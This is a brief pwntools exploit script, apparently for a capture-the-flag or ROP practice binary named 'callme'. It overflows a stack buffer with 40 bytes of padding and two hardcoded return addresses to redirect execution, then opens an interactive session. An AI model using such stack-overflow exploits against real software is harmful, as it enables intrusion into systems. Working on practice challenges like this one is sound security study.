from pwn import *

#elf = ELF( './callme' )

#p = elf.process()
p = process( './mycallme' )

payload = b'a' * 40 + p64( 0x0000000000400589 ) + p64( 0x00400537 )

raw_input()
p.sendline( payload )

p.interactive()
